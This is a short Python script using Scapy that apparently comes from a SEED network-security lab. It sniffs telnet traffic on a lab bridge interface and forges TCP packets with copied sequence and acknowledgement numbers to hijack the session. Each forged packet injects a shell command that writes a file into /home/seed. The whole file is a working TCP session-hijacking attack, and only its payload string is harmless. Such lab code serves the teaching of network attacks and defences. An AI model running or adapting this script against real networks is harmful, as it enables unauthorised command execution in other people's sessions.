from scapy.all import *

interface = "br-08174a224f46"
dstPORT = "23" # telnet port

def do_hijack(pkt):
    ip = IP(id=pkt[IP].id+1, src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
            seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=0x18) # 0x18 = 24 --> ACK/PSH
    raw = Raw(load='\r\necho "malicious content" > /home/seed/malicious_file.txt\r\n')
    pkt = ip/tcp/raw
    send(pkt, verbose=0)

sniff(iface=interface, filter='dst port ' + dstPORT, prn=do_hijack)
